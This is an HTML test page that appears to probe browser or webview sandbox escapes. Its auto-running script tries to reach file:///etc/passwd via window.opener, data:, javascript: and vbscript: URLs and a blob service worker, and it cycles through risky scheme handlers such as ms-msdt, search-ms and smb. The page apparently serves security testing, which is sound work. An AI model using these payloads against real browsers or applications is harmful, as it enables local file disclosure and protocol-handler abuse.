<!-- protocol_bypass.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Advanced Protocol Handler Bypass Tests</title>
    <script>
    // Try to load immediately with various bypass techniques
    window.onload = function() {
        console.log('Starting protocol bypass tests...');
        
        // Test 1: Using window.opener chain
        try {
            if (window.opener) {
                console.log('Has opener, trying to access file://');
                window.opener.location.href = 'file:///etc/passwd';
            }
        } catch (e) {
            console.log('Opener access blocked:', e.message);
        }
        
        // Test 2: Using postMessage to iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'about:blank';
        document.body.appendChild(iframe);
        
        iframe.onload = function() {
            try {
                iframe.contentWindow.postMessage({
                    action: 'navigate',
                    url: 'file:///etc/passwd'
                }, '*');
            } catch (e) {
                console.log('postMessage blocked:', e.message);
            }
        };
        
        // Listen for messages
        window.addEventListener('message', function(event) {
            if (event.data.action === 'loadFile') {
                console.log('Received request to load file');
                try {
                    window.location.href = event.data.url;
                } catch (e) {
                    console.log('Navigation blocked:', e.message);
                }
            }
        });
    };
    
    // Test 3: Using data: URLs with file:// references
    function testDataURLBypass() {
        console.log('Testing data: URL bypass...');
        
        const dataURLs = [
            'data:text/html,<iframe src="file:///etc/passwd"></iframe>',
            'data:text/html,<script>window.open("file:///etc/passwd")</script>',
            'data:text/html,<meta http-equiv="refresh" content="0;url=file:///etc/passwd">',
            'javascript:window.location="file:///etc/passwd"',
            'vbscript:Execute("MsgBox ""test""")'
        ];
        
        dataURLs.forEach((url, index) => {
            setTimeout(() => {
                console.log(`Trying data URL ${index + 1}`);
                try {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = url;
                    iframe.onload = () => console.log(`Data URL ${index + 1} loaded`);
                    iframe.onerror = () => console.log(`Data URL ${index + 1} blocked`);
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 1000);
                } catch (e) {
                    console.log(`Error: ${e.message}`);
                }
            }, index * 2000);
        });
    }
    
    // Test 4: Using Service Workers to proxy requests
    async function testServiceWorkerBypass() {
        if (!navigator.serviceWorker) {
            console.log('Service Worker not supported');
            return;
        }
        
        console.log('Testing Service Worker bypass...');
        
        const swCode = `
            self.addEventListener('fetch', event => {
                console.log('SW fetching:', event.request.url);
                
                // Try to intercept and redirect to file://
                if (event.request.url.includes('redirect-to-file')) {
                    event.respondWith(
                        fetch('file:///etc/passwd').catch(e => {
                            return new Response('Blocked: ' + e.message, { status: 403 });
                        })
                    );
                }
            });
        `;
        
        try {
            const registration = await navigator.serviceWorker.register(
                URL.createObjectURL(new Blob([swCode], { type: 'application/javascript' }))
            );
            
            console.log('Service Worker registered');
            
            // Try to trigger the fetch
            fetch('/redirect-to-file').catch(e => {
                console.log('Fetch blocked:', e.message);
            });
            
            // Cleanup
            setTimeout(() => registration.unregister(), 5000);
            
        } catch (e) {
            console.log('Service Worker error:', e.message);
        }
    }
    
    // Run tests
    setTimeout(testDataURLBypass, 1000);
    setTimeout(testServiceWorkerBypass, 3000);
    </script>
</head>
<body>
    <h1>Advanced Protocol Handler Bypass Tests</h1>
    <p>Check browser console for results</p>
    
    <button onclick="runComprehensiveTests()">Run Comprehensive Tests</button>
    <div id="results"></div>
    
    <script>
    async function runComprehensiveTests() {
        const resultsDiv = document.getElementById('results');
        resultsDiv.innerHTML = '<h3>Comprehensive Protocol Tests</h3>';
        
        // Test protocol schemes
        const schemes = [
            // File access schemes
            'file://',
            'local://',
            'localfile://',
            'chrome://',
            'chrome-extension://',
            'resource://',
            'about://',
            'view-source:',
            
            // Windows specific
            'ms-msdt://',
            'search-ms://',
            'ms-officecmd://',
            'ms-settings://',
            'ms-cxh://',
            
            // Network protocols
            '\\\\', // UNC
            'smb://',
            'ftp://',
            'sftp://',
            
            // Custom/obscure
            'gopher://',
            'telnet://',
            'mailto://',
            'news://',
            'nntp://'
        ];
        
        for (const scheme of schemes) {
            resultsDiv.innerHTML += `<br>Testing: ${scheme}<br>`;
            
            // Test 1: Direct navigation
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = scheme + 'test';
                
                iframe.onload = function() {
                    resultsDiv.innerHTML += `‚úì ${scheme} iframe loaded<br>`;
                    
                    try {
                        // Try to access iframe content
                        const doc = iframe.contentDocument;
                        if (doc) {
                            resultsDiv.innerHTML += `‚ö†Ô∏è Can access ${scheme} document!<br>`;
                        }
                    } catch (e) {
                        resultsDiv.innerHTML += `‚úì Cross-origin blocked for ${scheme}<br>`;
                    }
                };
                
                iframe.onerror = function() {
                    resultsDiv.innerHTML += `‚úó ${scheme} iframe blocked<br>`;
                };
                
                document.body.appendChild(iframe);
                setTimeout(() => iframe.remove(), 2000);
                
            } catch (e) {
                resultsDiv.innerHTML += `‚úó Error: ${e.message}<br>`;
            }
            
            // Test 2: window.open
            try {
                const win = window.open(scheme + 'test', '_blank', 'noopener,noreferrer');
                if (win) {
                    setTimeout(() => {
                        if (!win.closed) {
                            resultsDiv.innerHTML += `‚ö†Ô∏è ${scheme} window opened<br>`;
                            
                            try {
                                win.document;
                                resultsDiv.innerHTML += `üö® Can access ${scheme} window document!<br>`;
                            } catch (e) {
                                resultsDiv.innerHTML += `‚úì ${scheme} window document access blocked<br>`;
                            }
                            
                            win.close();
                        } else {
                            resultsDiv.innerHTML += `‚úì ${scheme} window closed by browser<br>`;
                        }
                    }, 1000);
                } else {
                    resultsDiv.innerHTML += `‚úì ${scheme} window.open blocked<br>`;
                }
            } catch (e) {
                resultsDiv.innerHTML += `‚úó window.open error: ${e.message}<br>`;
            }
            
            // Delay between tests
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    </script>
</body>
</html>
